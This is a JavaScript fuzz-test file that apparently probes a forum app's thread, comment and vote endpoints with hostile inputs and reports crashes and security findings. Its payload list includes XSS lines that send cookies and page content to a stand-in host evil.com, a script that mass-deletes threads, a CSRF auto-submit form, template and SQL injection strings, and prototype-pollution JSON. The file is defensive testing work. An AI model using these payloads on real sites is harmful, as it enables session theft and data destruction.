/**
 * Comprehensive Forum/Thread Fuzzer
 * Tests all forum endpoints with domain-specific attacks and edge cases
 */

// Load test environment variables
require('dotenv').config({ path: '../../.env.test' });

// Set required env vars if not set
process.env.JWT_SECRET = process.env.JWT_SECRET || 'test-secret-key-for-fuzzing';
process.env.MONGO_URI = process.env.MONGO_URI || 'mongodb://localhost:27017/nurtura-test';
process.env.NODE_ENV = 'test';

const request = require('supertest');
const { faker } = require('@faker-js/faker');
const app = require('../../server');

class ForumFuzzer {
  constructor() {
    this.results = {
      totalRequests: 0,
      crashes: 0,
      errors: [],
      responses: [],
      securityIssues: [],
      businessLogicFlaws: []
    };
    
    // Real endpoints from your code
    this.endpoints = [
      // Thread endpoints
      { method: 'GET', path: '/api/threads', auth: false },
      { method: 'POST', path: '/api/threads', auth: true },
      { method: 'GET', path: '/api/threads/:id', auth: false },
      { method: 'PATCH', path: '/api/threads/:id/vote', auth: true },
      { method: 'DELETE', path: '/api/threads/:id', auth: true },
      { method: 'GET', path: '/api/threads/:id/replies/count', auth: false },
      
      // Comment endpoints (nested under threads)
      { method: 'GET', path: '/api/threads/:threadId/comments', auth: false },
      { method: 'POST', path: '/api/threads/:threadId/comments', auth: false }, // No auth in your route
      { method: 'DELETE', path: '/api/threads/:threadId/comments/:id', auth: false }
    ];

    this.validObjectId = '507f1f77bcf86cd799439011';
    this.authTokens = new Map(); // Store tokens for different users
  }

  // Forum-specific malicious payloads
  generateForumSpecificPayloads() {
    return [
      // XSS in forum context
      '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>',
      '<img src="x" onerror="fetch(\'/api/threads\', {method: \'DELETE\'})">',
      '<svg onload="new Image().src=\'http://evil.com/?\'+btoa(document.body.innerHTML)">',
      
      // Forum-specific injection
      '"><script>Array.from(document.querySelectorAll(\'[data-thread-id]\')).forEach(el=>fetch(\'/api/threads/\'+el.dataset.threadId, {method:\'DELETE\'}))</script>',
      
      // Content manipulation
      '\u202E\u0041\u0042\u0043\u202D', // Right-to-left override (can hide malicious content)
      '\u00A0'.repeat(1000), // Non-breaking spaces (layout attacks)
      
      // Forum spam patterns
      'BUY CHEAP VIAGRA '.repeat(100),
      'http://spam.com '.repeat(50),
      Array(100).fill('FIRST!!!').join('\n'),
      
      // Unicode exploits for forums
      '𝕊𝕡𝕖𝕔𝕚𝕒𝕝 𝔽𝕠𝔯𝔪𝔞𝔱𝔱𝔦𝔫𝔤', // Mathematical alphanumeric symbols
      '🔥💯🚀'.repeat(500), // Emoji spam
      
      // Template injection (common in forums)
      '{{constructor.constructor("return process")().exit()}}',
      '#{7*7}',
      '${{7*7}}',
      '<%=7*7%>',
      
      // Forum-specific CSRF attempts
      '<form action="/api/threads" method="post"><input name="title" value="Hacked"><input name="content" value="CSRF worked"></form><script>document.forms[0].submit()</script>',
      
      // Vote manipulation attempts
      '{"direction": "up", "userId": "' + this.validObjectId + '"}',
      '{"direction": "sideways"}',
      '{"direction": ["up", "down"]}',
      
      // Large content attacks (forum-specific)
      'A'.repeat(1000000), // 1MB of text
      Array(10000).fill('spam line').join('\n'), // Many lines
      
      // Markdown/BBCode injection (if you parse these)
      '[url=javascript:alert(1)]Click me[/url]',
      '![alt](javascript:alert(1))',
      '[img]data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+[/img]',
      
      // Thread/Comment relationship manipulation
      'thread_' + faker.string.uuid(),
      'comment_' + faker.string.uuid(),
      
      // JSON pollution
      '{"__proto__": {"admin": true}}',
      '{"constructor": {"prototype": {"admin": true}}}',
    ];
  }

  generateThreadData(malicious = false) {
    if (malicious) {
      const payload = faker.helpers.arrayElement(this.generateForumSpecificPayloads());
      return {
        title: Math.random() > 0.5 ? payload : faker.lorem.sentence(),
        content: Math.random() > 0.5 ? payload : faker.lorem.paragraphs(),
        author: Math.random() > 0.5 ? payload : faker.person.firstName(),
        date: Math.random() > 0.5 ? payload : new Date().toISOString(),
        upvotes: Math.random() > 0.5 ? payload : faker.number.int({ min: -1000, max: 1000 })
      };
    }

    // Generate edge case data
    const edgeCases = [
      // Empty/null values
      { title: '', content: '', author: '' },
      { title: null, content: null, author: null },
      { title: undefined, content: undefined, author: undefined },
      
      // Type confusion
      { title: 123, content: true, author: [] },
      { title: {}, content: {nested: 'object'}, author: ['array'] },
      
      // Extreme lengths
      { title: 'A'.repeat(10000), content: 'B'.repeat(100000), author: 'C'.repeat(1000) },
      { title: faker.lorem.sentence(), content: '', author: faker.person.firstName() },
      
      // Special characters
      { title: '🔥💯🚀', content: '\n\r\t\0', author: '\\x00\\xFF' },
      
      // SQL-like (even though you use MongoDB)
      { title: "'; DROP TABLE threads; --", content: "1' OR '1'='1", author: "admin'--" },
      
      // Date edge cases
      { date: 'invalid-date' },
      { date: '1970-01-01T00:00:00.000Z' },
      { date: '9999-12-31T23:59:59.999Z' },
      { date: -1 },
      { date: Number.MAX_SAFE_INTEGER },
    ];
    
    return faker.helpers.arrayElement(edgeCases);
  }

  generateCommentData(threadId, malicious = false) {
    if (malicious) {
      const payload = faker.helpers.arrayElement(this.generateForumSpecificPayloads());
      return {
        threadId: Math.random() > 0.7 ? payload : threadId,
        content: Math.random() > 0.5 ? payload : faker.lorem.paragraph(),
        author: Math.random() > 0.5 ? payload : faker.person.firstName(),
        date: Math.random() > 0.5 ? payload : new Date().toISOString()
      };
    }

    return {
      threadId: faker.helpers.arrayElement([
        threadId,
        'invalid-id',
        null,
        undefined,
        '',
        123,
        [],
        {}
      ]),
      content: faker.helpers.arrayElement([
        faker.lorem.paragraph(),
        '',
        null,
        'A'.repeat(50000),
        '<script>alert("xss")</script>',
        { nested: 'object' }
      ]),
      author: faker.helpers.arrayElement([
        faker.person.firstName(),
        '',
        null,
        123,
        '🔥admin🔥'
      ]),
      date: faker.helpers.arrayElement([
        new Date().toISOString(),
        'invalid-date',
        -1,
        null
      ])
    };
  }

  generateVoteData(malicious = false) {
    if (malicious) {
      return faker.helpers.arrayElement([
        { direction: 'up', userId: this.validObjectId }, // Vote manipulation
        { direction: 'down', userId: 'invalid-user-id' },
        { direction: 'sideways' }, // Invalid direction
        { direction: ['up', 'down'] }, // Array instead of string
        { direction: 'up'.repeat(1000) }, // Very long string
        { direction: null },
        { direction: 123 },
        { direction: {} },
        'not-an-object',
        null
      ]);
    }

    return faker.helpers.arrayElement([
      { direction: 'up' },
      { direction: 'down' },
      { direction: null },
      { direction: '' },
      { direction: 'invalid' },
      {}
    ]);
  }

  async createTestUser() {
    const testUser = {
      username: faker.internet.userName() + Date.now(),
      email: faker.internet.email(),
      password: 'Test123456!'
    };
    
    try {
      await request(app)
        .post('/api/auth/register')
        .send(testUser);
        
      const loginRes = await request(app)
        .post('/api/auth/login')
        .send({
          username: testUser.username,
          password: testUser.password
        });
        
      const token = loginRes.headers['set-cookie']?.[0];
      this.authTokens.set(testUser.username, token);
      return { user: testUser, token };
    } catch (err) {
      console.log('Failed to create test user:', err.message);
      return null;
    }
  }

  async createTestThread(token) {
    try {
      const threadData = {
        title: 'Test Thread ' + Date.now(),
        content: 'Test content for fuzzing',
        author: 'TestUser',
        date: new Date().toISOString(),
        upvotes: 0
      };

      const response = await request(app)
        .post('/api/threads')
        .set('Cookie', token)
        .send(threadData);

      return response.body._id;
    } catch (err) {
      return this.validObjectId; // Fallback to valid ObjectId
    }
  }

  async fuzzThreadEndpoints(iterations = 30) {
    console.log('\n🎯 Fuzzing Thread Endpoints...');
    
    // Create test user for authenticated requests
    const testAuth = await this.createTestUser();
    const testThreadId = testAuth ? await this.createTestThread(testAuth.token) : this.validObjectId;
    
    for (const endpoint of this.endpoints.filter(e => e.path.includes('/threads') && !e.path.includes('/comments'))) {
      await this.fuzzEndpoint(endpoint, testAuth?.token, testThreadId, iterations);
    }
  }

  async fuzzCommentEndpoints(iterations = 30) {
    console.log('\n🎯 Fuzzing Comment Endpoints...');
    
    const testAuth = await this.createTestUser();
    const testThreadId = testAuth ? await this.createTestThread(testAuth.token) : this.validObjectId;
    
    for (const endpoint of this.endpoints.filter(e => e.path.includes('/comments'))) {
      await this.fuzzEndpoint(endpoint, testAuth?.token, testThreadId, iterations);
    }
  }

  async fuzzBusinessLogic(iterations = 20) {
    console.log('\n🎯 Fuzzing Business Logic...');
    
    const testAuth = await this.createTestUser();
    if (!testAuth) return;
    
    const testThreadId = await this.createTestThread(testAuth.token);
    
    // Test vote manipulation
    for (let i = 0; i < iterations; i++) {
      try {
        this.results.totalRequests++;
        
        // Rapid-fire voting (race condition test)
        const votePromises = Array(10).fill().map(() =>
          request(app)
            .patch(`/api/threads/${testThreadId}/vote`)
            .set('Cookie', testAuth.token)
            .send({ direction: faker.helpers.arrayElement(['up', 'down']) })
        );
        
        await Promise.all(votePromises);
        
        // Check final vote state
        const threadCheck = await request(app)
          .get(`/api/threads/${testThreadId}`);
          
        if (Math.abs(threadCheck.body.upvotes) > 10) {
          this.results.businessLogicFlaws.push({
            issue: 'Vote race condition - user voted multiple times',
            threadId: testThreadId,
            finalVotes: threadCheck.body.upvotes
          });
        }
        
      } catch (err) {
        // Expected - testing race conditions
      }
    }
    
    // Test comment bombing
    try {
      const commentPromises = Array(100).fill().map(() =>
        request(app)
          .post(`/api/threads/${testThreadId}/comments`)
          .send(this.generateCommentData(testThreadId, true))
      );
      
      await Promise.all(commentPromises);
      
      const commentCount = await request(app)
        .get(`/api/threads/${testThreadId}/replies/count`);
        
      if (commentCount.body.count > 50) {
        this.results.businessLogicFlaws.push({
          issue: 'Comment flooding - no rate limiting detected',
          commentCount: commentCount.body.count
        });
      }
    } catch (err) {
      // Expected
    }
  }

  async fuzzEndpoint(endpoint, token, testThreadId, iterations = 30) {
    console.log(`  Testing ${endpoint.method} ${endpoint.path}...`);
    
    for (let i = 0; i < iterations; i++) {
      try {
        this.results.totalRequests++;
        
        // Replace path parameters
        let path = endpoint.path
          .replace(':id', faker.helpers.arrayElement([testThreadId, this.validObjectId, 'invalid-id', '', '123']))
          .replace(':threadId', faker.helpers.arrayElement([testThreadId, this.validObjectId, 'invalid-id']))
          .replace(':commentId', faker.helpers.arrayElement([this.validObjectId, 'invalid-id']));
        
        const req = request(app)[endpoint.method.toLowerCase()](path);
        
        // Add auth if required
        if (endpoint.auth && token) {
          req.set('Cookie', token);
        }
        
        // Add malicious headers
        req.set('User-Agent', faker.helpers.arrayElement([
          faker.internet.userAgent(),
          '<script>alert(1)</script>',
          'A'.repeat(10000)
        ]));
        
        // Add request body based on endpoint
        if (['POST', 'PUT', 'PATCH'].includes(endpoint.method)) {
          let bodyData;
          
          if (path.includes('/vote')) {
            bodyData = this.generateVoteData(Math.random() > 0.5);
          } else if (path.includes('/comments')) {
            bodyData = this.generateCommentData(testThreadId, Math.random() > 0.5);
          } else if (path.includes('/threads') && endpoint.method === 'POST') {
            bodyData = this.generateThreadData(Math.random() > 0.5);
          } else {
            bodyData = faker.helpers.arrayElement(this.generateForumSpecificPayloads());
          }
          
          req.send(bodyData);
        }
        
        const response = await req.timeout(10000);
        
        this.results.responses.push({
          endpoint: `${endpoint.method} ${path}`,
          status: response.status,
          responseTime: response.duration || 0
        });
        
        // Check for security issues
        if (response.status === 500 && 
            !response.body?.message?.includes('Cast') && 
            !response.body?.message?.includes('ObjectId')) {
          this.results.crashes++;
          this.results.errors.push({
            endpoint: `${endpoint.method} ${path}`,
            status: response.status,
            error: response.body
          });
        }
        
        // Check for potential XSS reflection
        if (response.text && response.text.includes('<script>')) {
          this.results.securityIssues.push({
            type: 'XSS Reflection',
            endpoint: `${endpoint.method} ${path}`,
            evidence: 'Script tags found in response'
          });
        }
        
        // Check for information disclosure
        if (response.body?.stack || response.text?.includes('Error:')) {
          this.results.securityIssues.push({
            type: 'Information Disclosure',
            endpoint: `${endpoint.method} ${path}`,
            evidence: 'Stack trace or detailed error in response'
          });
        }
        
      } catch (error) {
        if (error.code !== 'ECONNABORTED') {
          this.results.crashes++;
          this.results.errors.push({
            endpoint: `${endpoint.method} ${endpoint.path}`,
            error: error.message
          });
        }
      }
    }
  }

  async runComprehensiveTest(iterations = 25) {
    console.log('🚀 Starting Comprehensive Forum Fuzz Testing...\n');
    
    await this.fuzzThreadEndpoints(iterations);
    await this.fuzzCommentEndpoints(iterations);
    await this.fuzzBusinessLogic(iterations);
    
    return this.generateReport();
  }

  generateReport() {
    const report = {
      summary: {
        totalRequests: this.results.totalRequests,
        totalCrashes: this.results.crashes,
        crashRate: ((this.results.crashes / this.results.totalRequests) * 100).toFixed(2) + '%',
        securityIssues: this.results.securityIssues.length,
        businessLogicFlaws: this.results.businessLogicFlaws.length
      },
      securityIssues: this.results.securityIssues,
      businessLogicFlaws: this.results.businessLogicFlaws,
      errors: this.results.errors.slice(0, 10), // Limit output
      statusDistribution: this.results.responses.reduce((acc, r) => {
        acc[r.status] = (acc[r.status] || 0) + 1;
        return acc;
      }, {})
    };
    
    console.log('\n📊 Comprehensive Forum Fuzz Results:');
    console.log('=========================================');
    console.log(`Total Requests: ${report.summary.totalRequests}`);
    console.log(`Crashes: ${report.summary.totalCrashes} (${report.summary.crashRate})`);
    console.log(`Security Issues: ${report.summary.securityIssues}`);
    console.log(`Business Logic Flaws: ${report.summary.businessLogicFlaws}`);
    console.log(`Status Distribution:`, report.statusDistribution);
    
    if (this.results.securityIssues.length > 0) {
      console.log('\n🚨 Security Issues Found:');
      this.results.securityIssues.forEach((issue, i) => {
        console.log(`${i + 1}. ${issue.type} in ${issue.endpoint}: ${issue.evidence}`);
      });
    }
    
    if (this.results.businessLogicFlaws.length > 0) {
      console.log('\n⚠️ Business Logic Issues:');
      this.results.businessLogicFlaws.forEach((issue, i) => {
        console.log(`${i + 1}. ${issue.issue}`);
      });
    }
    
    if (this.results.errors.length > 0) {
      console.log('\n💥 Critical Errors:');
      this.results.errors.slice(0, 5).forEach((error, i) => {
        console.log(`${i + 1}. ${error.endpoint}: ${typeof error.error === 'string' ? error.error : JSON.stringify(error.error)}`);
      });
    }
    
    return report;
  }
}

// Run if called directly
if (require.main === module) {
  const fuzzer = new ForumFuzzer();
  fuzzer.runComprehensiveTest(30).then(() => {
    process.exit(0);
  }).catch(err => {
    console.error('Forum fuzzer failed:', err);
    process.exit(1);
  });
}

module.exports = ForumFuzzer;